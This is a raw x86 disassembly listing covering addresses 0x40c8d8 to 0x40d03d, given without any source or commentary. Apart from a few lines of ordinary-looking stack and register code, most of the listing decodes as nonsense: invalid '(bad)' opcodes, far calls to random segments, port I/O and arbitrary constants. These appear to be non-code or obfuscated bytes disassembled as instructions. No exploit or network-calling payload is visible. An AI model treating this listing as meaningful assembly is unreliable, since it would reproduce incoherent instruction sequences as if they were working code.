  40c8d8:	stos   DWORD PTR es:[edi],eax
  40c8d9:	and    dh,BYTE PTR [edx]
  40c8db:	sbb    BYTE PTR [ecx+0x7a],0x85
  40c8df:	(bad)  
  40c8e0:	(bad)  
  40c8e1:	or     eax,esi
  40c8e3:	fsubr  st(6),st
  40c8e5:	sbb    DWORD PTR ds:0xc52b20b8,edx
  40c8eb:	(bad)  
  40c8ec:	iret   
  40c8ed:	mov    edi,0x687177c9
  40c8f2:	arpl   WORD PTR [eax],sp
  40c8f4:	bound  eax,QWORD PTR [eax-0x70f474ec]
  40c8fa:	add    al,0xa6
  40c8fc:	push   ebx
  40c8fd:	fsubr  QWORD PTR [ebx-0x20]
  40c900:	call   0x2df4:0xe8cea944
  40c907:	inc    edx
  40c908:	push   esp
  40c909:	mov    ss,eax
  40c90b:	cmp    eax,0xc672a11a
  40c910:	push   ss
  40c911:	sti    
  40c912:	sub    BYTE PTR [edi],dh
  40c914:	mov    ss,WORD PTR [edx]
  40c916:	or     dh,al
  40c918:	loopne 0x40c91d
  40c91a:	jbe    0x40c944
  40c91c:	xor    DWORD PTR [edx-0x4c],ecx
  40c91f:	or     al,0xd7
  40c921:	inc    eax
  40c922:	iret   
  40c923:	xchg   edi,eax
  40c924:	(bad)  
  40c925:	push   edi
  40c926:	test   BYTE PTR [ebx+0xc8aec4d],0x8
  40c92d:	mov    eax,DWORD PTR [ebp-0x34]
  40c930:	or     BYTE PTR [eax],cl
  40c932:	mov    eax,DWORD PTR [ebp+0x10]
  40c935:	mov    ecx,eax
  40c937:	jmp    0x40cec1
  40c93c:	and    DWORD PTR [edx],ebp
  40c93e:	sbb    cl,BYTE PTR ds:0x1a21fd20
  40c944:	in     al,dx
  40c945:	and    al,0xf9
  40c947:	push   0xb43ca002
  40c94c:	jae    0x40c918
  40c94e:	push   ss
  40c94f:	push   ss
  40c950:	cmp    eax,0x9161604
  40c955:	sub    edx,DWORD PTR [edi-0x2a279d12]
  40c95b:	pusha  
  40c95c:	(bad)  
  40c95d:	(bad)  
  40c95e:	sbb    DWORD PTR [eax],ebx
  40c960:	xchg   esi,eax
  40c961:	into   
  40c962:	js     0x40c9ac
  40c964:	call   0x6db0:0x2ec2bfaa
  40c96b:	cs popa 
  40c96d:	shl    BYTE PTR [eax+0x6d0fba67],1
  40c973:	mov    al,ds:0x7e4e79be
  40c978:	jb     0x40c9a1
  40c97a:	scas   eax,DWORD PTR es:[edi]
  40c97b:	mov    al,ds:0x80803dfb
  40c980:	or     edi,ebp
  40c982:	dec    esi
  40c983:	jle    0x40c9c5
  40c985:	xchg   esi,edi
  40c987:	pop    esp
  40c988:	hlt    
  40c989:	mov    dh,0x19
  40c98b:	sbb    al,0x9f
  40c98d:	data16 mov cl,0xe0
  40c990:	lock fadd QWORD PTR [esi-0x4a]
  40c994:	sbb    al,0xee
  40c996:	mov    edi,0xa442bad2
  40c99b:	or     eax,DWORD PTR [ebp-0x77deca2]
  40c9a1:	add    eax,0xb3a187bd
  40c9a6:	mov    dh,0x6
  40c9a8:	and    al,0x41
  40c9aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9ab:	(bad)  
  40c9ad:	addr16 jl 0x40c98a
  40c9b0:	pop    ebx
  40c9b1:	ins    BYTE PTR es:[edi],dx
  40c9b2:	ds inc ebp
  40c9b4:	mov    cl,0xec
  40c9b6:	dec    esi
  40c9b7:	sete   BYTE PTR [edx-0x20850a2]
  40c9be:	add    eax,0xeb74705e
  40c9c3:	imul   BYTE PTR [ecx]
  40c9c5:	xchg   esp,eax
  40c9c6:	jg     0x40c973
  40c9c8:	popa   
  40c9c9:	setp   dl
  40c9cc:	add    DWORD PTR [ebp-0x47],0x76
  40c9d0:	push   esi
  40c9d1:	xchg   ebp,eax
  40c9d2:	mov    eax,0x8683d236
  40c9d7:	mov    WORD PTR [edi],gs
  40c9d9:	or     al,dl
  40c9db:	add    BYTE PTR [ebp-0x62310de],0x6a
  40c9e2:	fsubr  st(2),st
  40c9e4:	retf   0x9e48
  40c9e7:	repz xor BYTE PTR [eax-0xc415c0e],cl
  40c9ee:	adc    eax,0x41ed26f
  40c9f3:	xor    al,BYTE PTR [eax]
  40c9f5:	adc    BYTE PTR [ebx+eiz*2],ch
  40c9f8:	pushf  
  40c9f9:	nop
  40c9fa:	cs pusha 
  40c9fc:	jg     0x40ca65
  40c9fe:	iret   
  40c9ff:	ins    DWORD PTR es:[edi],dx
  40ca00:	lahf   
  40ca01:	push   edi
  40ca02:	xor    edi,DWORD PTR [edi+0x15]
  40ca05:	push   ecx
  40ca06:	xchg   esp,eax
  40ca07:	cdq    
  40ca08:	in     eax,0x25
  40ca0a:	xchg   ebx,eax
  40ca0b:	daa    
  40ca0c:	sahf   
  40ca0d:	jo     0x40ca2b
  40ca0f:	sub    DWORD PTR [edx+0x49042a55],ecx
  40ca15:	or     ch,BYTE PTR [esi]
  40ca17:	fbld   TBYTE PTR [ecx-0x46d043bd]
  40ca1d:	mov    fs,WORD PTR [ebp+0x322abbda]
  40ca23:	dec    ebp
  40ca24:	fidivr WORD PTR [eax-0x34]
  40ca27:	sub    dl,ah
  40ca29:	mov    edi,0x291bfbb2
  40ca2e:	mov    ds:0x3e7b23f1,eax
  40ca33:	(bad)  
  40ca34:	mov    esi,0xb64080f1
  40ca39:	sub    al,0x45
  40ca3b:	pop    ebx
  40ca3c:	loopne 0x40ca35
  40ca3e:	sub    DWORD PTR [ecx-0x45e8cf27],eax
  40ca44:	mov    ds:0x1f9763d3,eax
  40ca49:	mov    eax,DWORD PTR [ebx-0x1]
  40ca4c:	fs mov ecx,gs
  40ca4f:	pop    esi
  40ca50:	mov    ds:0xad771d66,eax
  40ca55:	xchg   ebp,eax
  40ca56:	dec    edi
  40ca57:	mov    ch,0xee
  40ca59:	and    BYTE PTR [eax],0x2d
  40ca5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca5d:	fwait
  40ca5e:	sub    eax,0xe811e78a
  40ca63:	xchg   ebp,eax
  40ca64:	ret    
  40ca65:	push   eax
  40ca66:	or     esi,edx
  40ca68:	mov    ds,WORD PTR [ebx-0x7a]
  40ca6b:	inc    esi
  40ca6c:	pop    ecx
  40ca6d:	pop    esi
  40ca6e:	(bad)  
  40ca6f:	xor    ah,dl
  40ca71:	mov    esp,0xef45d95c
  40ca76:	jmp    0x8f30:0x649257f7
  40ca7d:	cmp    eax,0xea1fc274
  40ca82:	ins    DWORD PTR es:[edi],dx
  40ca83:	push   eax
  40ca84:	adc    DWORD PTR [edi-0x6d],esi
  40ca87:	add    eax,0x57fba3eb
  40ca8c:	or     DWORD PTR [esi],eax
  40ca8e:	adc    BYTE PTR [ecx+0x73df9fcd],0xcd
  40ca95:	mov    edi,0x7c8b4038
  40ca9a:	push   edi
  40ca9b:	arpl   WORD PTR [edi-0x4bb17bb5],ax
  40caa1:	lea    esp,[ebp+0x5cc5e88]
  40caa7:	dec    esi
  40caa8:	pop    eax
  40caa9:	adc    edi,DWORD PTR [ebp+0x5a7c92a5]
  40caaf:	repz sub al,0xd4
  40cab2:	lea    ecx,[ebp+0x58a346b9]
  40cab8:	push   cs
  40cab9:	fst    DWORD PTR [edx-0x18bb77c6]
  40cabf:	in     eax,dx
  40cac0:	xor    al,0xf3
  40cac2:	je     0x40ca51
  40cac4:	cmp    DWORD PTR [esi+edx*2+0x50],ebp
  40cac8:	and    eax,0x282d6ee8
  40cacd:	ds scas al,BYTE PTR es:[edi]
  40cacf:	add    DWORD PTR [ecx],edi
  40cad1:	outs   dx,DWORD PTR ds:[esi]
  40cad2:	clc    
  40cad3:	cmp    DWORD PTR [ebx+0x3b],0xe38d5b6e
  40cada:	or     eax,0xfe9fcc45
  40cadf:	arpl   WORD PTR [edx+0x7c2c557],cx
  40cae5:	pusha  
  40cae6:	xchg   ebp,eax
  40cae7:	fwait
  40cae8:	clc    
  40cae9:	ja     0x40ca78
  40caeb:	loope  0x40cb13
  40caed:	popf   
  40caee:	das    
  40caef:	cmp    bh,BYTE PTR [edi+0x59]
  40caf2:	push   ds
  40caf3:	ss dec edx
  40caf5:	xchg   ecx,eax
  40caf6:	mov    edi,0x6cf95c69
  40cafb:	cmp    al,0xb
  40cafd:	pop    esi
  40cafe:	sub    ebp,DWORD PTR [esi-0xf429ed2]
  40cb04:	mov    ch,al
  40cb06:	jl     0x40cade
  40cb08:	xchg   esp,eax
  40cb09:	dec    eax
  40cb0a:	sub    dl,BYTE PTR [edx+0x478f64fb]
  40cb10:	dec    ebx
  40cb11:	sub    al,0xfd
  40cb13:	pop    ds
  40cb14:	cmp    al,BYTE PTR [eax]
  40cb16:	ins    BYTE PTR es:[edi],dx
  40cb17:	lea    esi,[edx]
  40cb19:	add    DWORD PTR [edx+0x7f771a1d],ebp
  40cb1f:	in     eax,0xec
  40cb21:	cli    
  40cb22:	pop    edx
  40cb23:	or     BYTE PTR [ebp-0x20],bh
  40cb26:	xor    esp,DWORD PTR [ecx-0x46d8d019]
  40cb2c:	sbb    eax,0xf35c2351
  40cb31:	inc    ecx
  40cb32:	inc    edi
  40cb33:	aas    
  40cb34:	jmp    0xcd7e:0x594e78e0
  40cb3b:	sub    DWORD PTR [esi],esi
  40cb3d:	jmp    FWORD PTR [eax-0x3c]
  40cb40:	js     0x40cb0c
  40cb42:	mov    esp,ss
  40cb44:	add    DWORD PTR [edx-0x5cbb35d8],esp
  40cb4a:	mov    ds:0x9ee3a54,eax
  40cb4f:	adc    al,0x33
  40cb51:	ins    BYTE PTR es:[edi],dx
  40cb52:	retf   
  40cb53:	jno    0x40caec
  40cb55:	xor    bh,cl
  40cb57:	cmp    al,0x80
  40cb59:	imul   edx,DWORD PTR fs:0xaba26ef5,0x90e5fcaa
  40cb64:	mov    cl,0xea
  40cb66:	in     eax,0xed
  40cb68:	sbb    BYTE PTR [ecx+0x74],bl
  40cb6b:	(bad)  
  40cb6c:	test   eax,0x4ad3777d
  40cb71:	fisttp WORD PTR [ebx]
  40cb73:	ret    
  40cb74:	cmp    al,0x9e
  40cb76:	leave  
  40cb77:	mov    ecx,0x5062a5e0
  40cb7c:	aad    0x4a
  40cb7e:	xchg   edi,eax
  40cb7f:	sbb    bl,BYTE PTR [ebp+0x2fc4ee43]
  40cb85:	push   0x3c
  40cb87:	int3   
  40cb88:	push   es
  40cb89:	clc    
  40cb8a:	in     eax,0xdd
  40cb8c:	in     al,0x1a
  40cb8e:	add    esi,DWORD PTR [esi]
  40cb90:	mov    WORD PTR [ebp-0xa],cs
  40cb93:	adc    ch,BYTE PTR [edi+0x3b40b9bb]
  40cb99:	rol    dh,cl
  40cb9b:	or     eax,0x81d7e17
  40cba0:	cwde   
  40cba1:	xor    edx,edi
  40cba3:	jmp    0x40cbd8
  40cba5:	mov    edi,0x3001ebaa
  40cbaa:	stos   BYTE PTR es:[edi],al
  40cbab:	lahf   
  40cbac:	mov    edx,ebp
  40cbae:	jp     0x40cb6b
  40cbb0:	xlat   BYTE PTR ds:[ebx]
  40cbb1:	or     bl,bh
  40cbb3:	iret   
  40cbb4:	(bad)  
  40cbb5:	mov    ds:0x4db4eeaf,al
  40cbba:	ret    
  40cbbb:	jg     0x40cbf2
  40cbbd:	pop    ss
  40cbbe:	repnz aas 
  40cbc0:	sbb    eax,0xb3344544
  40cbc5:	sti    
  40cbc6:	mov    esp,0x3c8257dd
  40cbcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbcc:	jp     0x40cc0b
  40cbce:	daa    
  40cbcf:	mov    ds:0x1e050765,al
  40cbd4:	mov    dh,BYTE PTR [esi-0x58877afe]
  40cbda:	push   edi
  40cbdb:	(bad)  
  40cbdc:	fs pop edx
  40cbde:	dec    edi
  40cbdf:	add    DWORD PTR [eax],ecx
  40cbe1:	aam    0x7
  40cbe3:	imul   eax,DWORD PTR [ecx+0x32c987da],0x634a04f2
  40cbed:	and    al,al
  40cbef:	pusha  
  40cbf0:	add    eax,0x47184dbd
  40cbf5:	stc    
  40cbf6:	mov    cl,0x84
  40cbf8:	imul   ebp,ecx,0x7b
  40cbfb:	pop    ecx
  40cbfc:	pop    ss
  40cbfd:	outs   dx,DWORD PTR ds:[esi]
  40cbfe:	inc    ecx
  40cbff:	cmp    bh,dl
  40cc01:	aaa    
  40cc02:	jmp    0x48d1:0xc62a2298
  40cc09:	add    ah,bl
  40cc0b:	sbb    al,0xc5
  40cc0d:	(bad)  
  40cc0f:	pop    esi
  40cc10:	fld    DWORD PTR [esi-0x449b70e7]
  40cc16:	mov    edi,0x23957dea
  40cc1b:	ret    
  40cc1c:	pop    ecx
  40cc1d:	ficomp WORD PTR [ebx+0x7d]
  40cc20:	push   ds
  40cc21:	or     esp,ebp
  40cc23:	mov    al,BYTE PTR [ebx]
  40cc25:	scas   al,BYTE PTR es:[edi]
  40cc26:	or     eax,0xf8132eaa
  40cc2b:	dec    esi
  40cc2c:	cs inc ebx
  40cc2e:	pushf  
  40cc2f:	mov    edi,0x2a827abc
  40cc34:	sub    edx,edi
  40cc36:	mov    WORD PTR [ebp-0x5f1e1bf8],fs
  40cc3c:	add    esp,DWORD PTR [esi]
  40cc3e:	push   edx
  40cc3f:	in     eax,0x57
  40cc41:	sub    BYTE PTR [eax-0x34],dl
  40cc44:	cmp    edi,0x299602ea
  40cc4a:	fs das 
  40cc4c:	data16 cs (bad) 
  40cc50:	ficom  WORD PTR [edx+ecx*2-0x29]
  40cc54:	popa   
  40cc55:	stc    
  40cc56:	dec    ebp
  40cc57:	mov    ecx,0xdfa9830b
  40cc5c:	outs   dx,DWORD PTR ss:[esi]
  40cc5e:	loopne 0x40cc2d
  40cc60:	popf   
  40cc61:	jns    0x40cbfb
  40cc63:	in     al,0x55
  40cc65:	mov    ds:0x3a76682f,al
  40cc6a:	mov    esp,0x2075462f
  40cc6f:	ja     0x40cc63
  40cc71:	xchg   DWORD PTR [esi+0x2baaa1a3],edi
  40cc77:	xor    DWORD PTR [esi+0x12],ebx
  40cc7a:	scas   al,BYTE PTR es:[edi]
  40cc7b:	lods   al,BYTE PTR ds:[esi]
  40cc7c:	xchg   edi,eax
  40cc7d:	push   ds
  40cc7e:	leave  
  40cc7f:	popa   
  40cc80:	aad    0x13
  40cc82:	inc    ebp
  40cc83:	scas   al,BYTE PTR es:[edi]
  40cc84:	and    bh,BYTE PTR [ebp-0x2cb1803b]
  40cc8a:	mov    esp,0xf1832a13
  40cc8f:	enter  0x3bd6,0xaa
  40cc93:	scas   eax,DWORD PTR es:[edi]
  40cc94:	jo     0x40ccfd
  40cc96:	lds    ebx,FWORD PTR [ebx+0x375fbc66]
  40cc9c:	sub    eax,DWORD PTR [esi+eax*2+0x4fd9cb8f]
  40cca3:	or     DWORD PTR [ecx+eax*2+0x4cfa8837],edi
  40ccaa:	jbe    0x40cc89
  40ccac:	jecxz  0x40cce1
  40ccae:	xor    al,0x1a
  40ccb0:	pop    es
  40ccb1:	ins    BYTE PTR es:[edi],dx
  40ccb2:	xchg   esi,eax
  40ccb3:	lods   al,BYTE PTR ds:[esi]
  40ccb4:	dec    ebp
  40ccb5:	outs   dx,BYTE PTR ds:[esi]
  40ccb6:	loopne 0x40ccb3
  40ccb8:	or     DWORD PTR ss:[edi+0x60],0xffffffaf
  40ccbd:	std    
  40ccbe:	dec    eax
  40ccbf:	lods   eax,DWORD PTR ds:[esi]
  40ccc0:	add    eax,0x7900cac1
  40ccc5:	pop    ds
  40ccc6:	jp     0x40ccc1
  40ccc8:	rcr    BYTE PTR [esp+ebp*8-0x62],0x30
  40cccd:	repnz dec edi
  40cccf:	nop
  40ccd0:	mov    eax,ds:0xc72d4ee4
  40ccd5:	imul   ebp,DWORD PTR [ebp+0x26],0xffffffec
  40ccd9:	ds xchg ah,bh
  40ccdc:	jge    0x40ccab
  40ccde:	int    0xc
  40cce0:	push   ebp
  40cce1:	jbe    0x40ccd7
  40cce3:	fs push ecx
  40cce5:	call   0xe6e4ea8f
  40ccea:	imul   ebx,DWORD PTR [ebx+esi*8-0x57],0xffffffc1
  40ccef:	test   DWORD PTR [ecx],edx
  40ccf1:	rcl    DWORD PTR [ebx+0x33586029],cl
  40ccf7:	mov    dh,0x67
  40ccf9:	cmp    dh,BYTE PTR [ebp-0x14]
  40ccfc:	lahf   
  40ccfd:	push   ecx
  40ccfe:	xchg   edi,eax
  40ccff:	arpl   WORD PTR [ebx],ax
  40cd01:	pop    edx
  40cd02:	adc    eax,0x941e756
  40cd07:	cmp    BYTE PTR [esp+esi*1-0x2fc5b59e],al
  40cd0e:	jmp    DWORD PTR [ecx]
  40cd10:	das    
  40cd11:	scas   al,BYTE PTR es:[edi]
  40cd12:	jo     0x40cd67
  40cd14:	pop    es
  40cd15:	neg    BYTE PTR [ecx]
  40cd17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd18:	jmp    FWORD PTR [edi+0x20]
  40cd1b:	sub    al,0xfb
  40cd1d:	cmp    bh,BYTE PTR [edi-0xa452214]
  40cd23:	or     al,0x6
  40cd25:	daa    
  40cd26:	push   0x4f2deba6
  40cd2b:	inc    edi
  40cd2c:	retf   0xa296
  40cd2f:	sub    ecx,edx
  40cd31:	retf   
  40cd32:	ins    DWORD PTR es:[edi],dx
  40cd33:	xor    al,0x47
  40cd35:	mov    WORD PTR [ecx-0x1ff30ba5],es
  40cd3b:	or     dh,cl
  40cd3d:	(bad)  
  40cd3e:	jns    0x40ccc7
  40cd40:	xor    al,0x10
  40cd42:	add    BYTE PTR [eax+0x57],0x78
  40cd46:	lahf   
  40cd47:	mov    BYTE PTR [edx-0x76],ch
  40cd4a:	cli    
  40cd4b:	ficom  WORD PTR [ebx+0x4f]
  40cd4e:	das    
  40cd4f:	cmp    DWORD PTR [edi-0x455d9a79],ebx
  40cd55:	push   esi
  40cd56:	or     dh,BYTE PTR [eax+0x2d]
  40cd59:	stos   BYTE PTR es:[edi],al
  40cd5a:	mov    bh,0x6f
  40cd5c:	cld    
  40cd5d:	jmp    0x1474fb4b
  40cd62:	add    eax,0x10234b2
  40cd67:	jo     0x40cd63
  40cd69:	or     DWORD PTR [eax],0x2b
  40cd6c:	pushf  
  40cd6d:	test   BYTE PTR [edi+0x4672af1e],0x82
  40cd74:	cld    
  40cd75:	in     eax,dx
  40cd76:	sub    edx,esp
  40cd78:	mov    al,0x18
  40cd7a:	neg    DWORD PTR [esi]
  40cd7c:	test   al,0xdd
  40cd7e:	(bad)  
  40cd7f:	loopne 0x40cddd
  40cd81:	int    0x56
  40cd83:	mov    ds:0x2a122ec0,al
  40cd88:	mov    ch,0xf0
  40cd8a:	sub    bh,bl
  40cd8c:	cmp    al,0xe1
  40cd8e:	test   BYTE PTR [edi-0x19338249],dh
  40cd94:	mov    dl,0xc7
  40cd96:	jle    0x40cd8e
  40cd98:	push   edx
  40cd99:	sbb    eax,0x2d531991
  40cd9e:	mov    al,ds:0x5b9bcbc6
  40cda3:	push   edx
  40cda4:	arpl   WORD PTR [esi],sp
  40cda6:	mov    DWORD PTR [esi],edi
  40cda8:	jecxz  0x40cd4d
  40cdaa:	ds cli 
  40cdac:	add    DWORD PTR [edi],esp
  40cdae:	xchg   edx,eax
  40cdaf:	lods   al,BYTE PTR ds:[esi]
  40cdb0:	pop    ecx
  40cdb1:	and    eax,0x55b9e567
  40cdb6:	arpl   WORD PTR [ecx-0x23445f72],si
  40cdbc:	ret    0x9563
  40cdbf:	shr    edi,1
  40cdc1:	or     al,0x82
  40cdc3:	dec    edi
  40cdc4:	xor    BYTE PTR [edi+0x2a],dl
  40cdc7:	pop    edi
  40cdc8:	xor    bh,bl
  40cdca:	and    esi,DWORD PTR [esi+esi*2+0x2e]
  40cdce:	loopne 0x40cd88
  40cdd0:	fdivr  DWORD PTR [ebx]
  40cdd2:	stos   DWORD PTR es:[edi],eax
  40cdd3:	aaa    
  40cdd4:	add    BYTE PTR [ebp-0x14],bh
  40cdd7:	and    eax,0x60c7b21b
  40cddc:	repnz enter 0xa9b2,0xb5
  40cde1:	jb     0x40cdee
  40cde3:	adc    DWORD PTR [edi-0x38e92887],edx
  40cde9:	dec    esp
  40cdea:	push   ebx
  40cdeb:	sahf   
  40cdec:	faddp  st(7),st
  40cdee:	mov    dl,0x39
  40cdf0:	xchg   ebp,eax
  40cdf1:	iret   
  40cdf2:	das    
  40cdf3:	pop    eax
  40cdf4:	sbb    dl,BYTE PTR [ebp-0x2a]
  40cdf7:	loopne 0x40cdca
  40cdf9:	retf   
  40cdfa:	xor    al,0x5d
  40cdfc:	sbb    esi,0xffffffc5
  40cdff:	enter  0xb473,0x93
  40ce03:	pop    edx
  40ce04:	xor    dl,bh
  40ce06:	or     BYTE PTR [edi+0x6d],ch
  40ce09:	scas   al,BYTE PTR es:[edi]
  40ce0a:	pop    ds
  40ce0b:	add    eax,0xa28a8b7
  40ce10:	outs   dx,DWORD PTR ds:[esi]
  40ce11:	xor    DWORD PTR [ebx],esi
  40ce13:	stos   DWORD PTR es:[edi],eax
  40ce14:	es adc al,0x74
  40ce17:	call   0x9263:0xd867255a
  40ce1e:	jno    0x40ce02
  40ce20:	pop    esi
  40ce21:	ret    
  40ce22:	inc    ebx
  40ce23:	dec    ebx
  40ce24:	sub    bh,BYTE PTR [ebx+eax*2-0x7c]
  40ce28:	idiv   BYTE PTR [ebx+0x4d]
  40ce2b:	jge    0x40ce48
  40ce2d:	or     DWORD PTR [ebp-0xe],ecx
  40ce30:	and    edx,DWORD PTR [ebx]
  40ce32:	adc    al,0xf1
  40ce34:	jg     0x40ceb3
  40ce36:	sub    ebx,DWORD PTR [eax+ebx*8-0x6861715d]
  40ce3d:	repnz add DWORD PTR [ebp+0x25ea0210],0xffffffdb
  40ce45:	xor    al,0xf8
  40ce47:	dec    eax
  40ce48:	fcomp  st(7)
  40ce4a:	js     0x40cdfd
  40ce4c:	icebp  
  40ce4d:	lds    esp,FWORD PTR [edx]
  40ce4f:	sbb    DWORD PTR [edx-0xd29ec07],esp
  40ce55:	xchg   ebp,eax
  40ce56:	inc    ebp
  40ce57:	jne    0x40cea1
  40ce59:	pop    ds
  40ce5a:	xor    eax,0xe8bad400
  40ce5f:	mov    ch,0xd0
  40ce61:	(bad)  
  40ce63:	xor    ch,dh
  40ce65:	or     eax,0x2f17759a
  40ce6a:	jbe    0x40ce8c
  40ce6c:	mov    ch,0x9d
  40ce6e:	xchg   BYTE PTR [ebp-0x4e],bl
  40ce71:	scas   al,BYTE PTR es:[edi]
  40ce72:	iret   
  40ce73:	sbb    DWORD PTR [eax],ecx
  40ce75:	fstp   TBYTE PTR [esi]
  40ce77:	es test edi,ebx
  40ce7a:	jge    0x40ce16
  40ce7c:	mov    bl,0xc4
  40ce7e:	jle    0x40cec7
  40ce80:	mul    DWORD PTR ds:0x5ec1646
  40ce86:	es scas eax,DWORD PTR es:[edi]
  40ce88:	je     0x40ce9f
  40ce8a:	push   DWORD PTR [ebp+0x1d9a5671]
  40ce90:	ficom  DWORD PTR [esi]
  40ce92:	repz in eax,dx
  40ce94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce95:	cmp    edi,DWORD PTR [ecx-0x3a23e547]
  40ce9b:	repnz mov ecx,0x55556b4e
  40cea1:	xchg   ebx,eax
  40cea2:	nop
  40cea3:	inc    edx
  40cea4:	out    dx,eax
  40cea5:	fbld   TBYTE PTR [ebx+0x1d]
  40cea8:	push   es
  40cea9:	xchg   esp,eax
  40ceaa:	fidivr DWORD PTR [ebx-0x190c7ba]
  40ceb0:	inc    edx
  40ceb1:	mov    ds:0x8468f1f0,al
  40ceb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ceb7:	mov    edx,DWORD PTR [edx+0x5d]
  40ceba:	push   ebp
  40cebb:	dec    esp
  40cebc:	or     ecx,DWORD PTR [esi+0xf268401]
  40cec2:	lods   al,BYTE PTR ds:[esi]
  40cec3:	rol    DWORD PTR [edx],1
  40cec5:	shl    eax,0x1e
  40cec8:	shr    edx,0x2
  40cecb:	mov    DWORD PTR [ebp+0x14],edx
  40cece:	mov    DWORD PTR [ebp+0x14],eax
  40ced1:	xor    edx,edx
  40ced3:	mov    eax,ecx
  40ced5:	xor    eax,edi
  40ced7:	or     eax,edx
  40ced9:	mov    edx,DWORD PTR [ebp-0x4]
  40cedc:	jmp    0x40d466
  40cee1:	lock jae 0x40cef2
  40cee4:	mov    ebp,0x13994155
  40cee9:	enter  0x8c7b,0x6e
  40ceed:	retf   0x42df
  40cef0:	test   al,0xa8
  40cef2:	enter  0x1616,0x3d
  40cef6:	add    al,0x16
  40cef8:	push   ss
  40cef9:	jmp    0xe5fe23c
  40cefe:	and    bh,bl
  40cf00:	push   eax
  40cf01:	pop    edx
  40cf02:	xor    al,BYTE PTR [edi-0x34]
  40cf05:	jmp    0x40ced1
  40cf07:	xchg   esi,eax
  40cf08:	popf   
  40cf09:	cwde   
  40cf0a:	sbb    BYTE PTR [edi-0x2c0031ed],0x23
  40cf11:	sub    bh,BYTE PTR [ecx]
  40cf13:	pop    edi
  40cf14:	cmp    ch,bl
  40cf16:	test   al,0x8a
  40cf18:	cmp    DWORD PTR [eax+0x67daa367],ecx
  40cf1e:	cmp    ebx,0x25
  40cf21:	adc    ch,BYTE PTR [ebx-0x536510d6]
  40cf27:	pop    ebp
  40cf28:	push   ecx
  40cf29:	sbb    dh,bl
  40cf2b:	sub    ah,ch
  40cf2d:	push   eax
  40cf2e:	aam    0x1a
  40cf30:	inc    ebx
  40cf31:	push   es
  40cf32:	mov    ds:0x6826945d,al
  40cf37:	sub    edx,DWORD PTR [eax]
  40cf39:	jno    0x40cf6d
  40cf3b:	xor    eax,0x30d12ceb
  40cf40:	pop    es
  40cf41:	bound  ebp,QWORD PTR [ebp-0x63]
  40cf44:	ins    DWORD PTR es:[edi],dx
  40cf45:	aam    0x52
  40cf47:	scas   eax,DWORD PTR es:[edi]
  40cf48:	ja     0x40cf85
  40cf4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf4b:	mov    al,ds:0x6b14e5e6
  40cf50:	inc    ecx
  40cf51:	cli    
  40cf52:	adc    ah,BYTE PTR [edx+0x4b]
  40cf55:	pop    ecx
  40cf56:	push   ecx
  40cf57:	fstp   DWORD PTR [eax+0x4fdff55]
  40cf5d:	mov    eax,esp
  40cf5f:	call   0x52b8:0xd8ce82ef
  40cf66:	cmc    
  40cf67:	pop    eax
  40cf68:	aam    0xa1
  40cf6a:	shl    BYTE PTR [esi-0x5c3a2a46],1
  40cf70:	jbe    0x40cf69
  40cf72:	add    al,BYTE PTR [ecx-0x4b]
  40cf75:	out    dx,al
  40cf76:	mov    edx,0xc1936916
  40cf7b:	loop   0x40cf5b
  40cf7d:	es dec edx
  40cf7f:	shl    DWORD PTR [ebx+ecx*1],cl
  40cf82:	cwde   
  40cf83:	popf   
  40cf84:	clc    
  40cf85:	sub    DWORD PTR [ebx-0x67],ebx
  40cf88:	pop    ebp
  40cf89:	mov    cs,WORD PTR [eax+0x155c6282]
  40cf8f:	test   al,0x88
  40cf91:	gs xchg esp,eax
  40cf93:	xchg   esi,eax
  40cf94:	jge    0x40cfa3
  40cf96:	jns    0x40cf5c
  40cf98:	add    al,0xd0
  40cf9a:	iret   
  40cf9b:	popf   
  40cf9c:	mov    ebx,DWORD PTR [ebp+0x758a3b5c]
  40cfa2:	cld    
  40cfa3:	daa    
  40cfa4:	sub    DWORD PTR [edi],edi
  40cfa6:	xor    dh,bl
  40cfa8:	aas    
  40cfa9:	aam    0x33
  40cfab:	add    bl,BYTE PTR [eax-0x153a06de]
  40cfb1:	jns    0x40d000
  40cfb3:	push   ecx
  40cfb4:	and    dl,BYTE PTR [edx+0x6fbba478]
  40cfba:	mov    esi,0xb62a2fa7
  40cfbf:	push   esp
  40cfc0:	fistp  WORD PTR [eax]
  40cfc2:	or     eax,DWORD PTR [ebx]
  40cfc4:	jmp    0x5364e1fd
  40cfc9:	das    
  40cfca:	add    al,0x6
  40cfcc:	inc    ecx
  40cfcd:	jae    0x40d026
  40cfcf:	or     BYTE PTR [ebx+0x2c4e0a89],ah
  40cfd5:	call   0x1d60d18
  40cfda:	aas    
  40cfdb:	in     eax,0x2
  40cfdd:	in     eax,dx
  40cfde:	add    eax,0x68289fd3
  40cfe3:	or     BYTE PTR fs:[ecx],0x28
  40cfe7:	xor    edi,eax
  40cfe9:	(bad)  ds:0xd668c266
  40cfef:	ins    DWORD PTR es:[edi],dx
  40cff0:	jae    0x40d026
  40cff2:	inc    eax
  40cff3:	ja     0x40d00c
  40cff5:	popf   
  40cff6:	adc    al,0x13
  40cff8:	(bad)  
  40cff9:	stos   DWORD PTR es:[edi],eax
  40cffa:	sar    al,0xbc
  40cffd:	test   ch,dh
  40cfff:	addr16 repz cli 
  40d002:	xchg   edi,eax
  40d003:	stc    
  40d004:	aas    
  40d005:	mov    ch,0x1a
  40d007:	xchg   DWORD PTR [ebx-0x7d],eax
  40d00a:	jb     0x40cfde
  40d00c:	loopne 0x40cfb4
  40d00e:	jnp    0x40d022
  40d010:	jno    0x40cf98
  40d012:	int    0x43
  40d014:	sbb    DWORD PTR [eax-0x36],edi
  40d017:	mov    esp,0x579d515
  40d01c:	mov    bh,0xf7
  40d01e:	mov    cl,0x73
  40d020:	rol    dh,0xb1
  40d023:	test   BYTE PTR ds:0xe3f6749f,0x7a
  40d02a:	jmp    0x34f9:0xebec0739
  40d031:	cmp    cl,BYTE PTR [edi+esi*2+0x46]
  40d035:	mov    ah,0x72
  40d037:	push   ebx
  40d038:	and    ebx,DWORD PTR [esi]
  40d03a:	xor    DWORD PTR [edx-0x34],esi
  40d03d:	cmp    dl,BYTE PTR [esp+ebp*1]
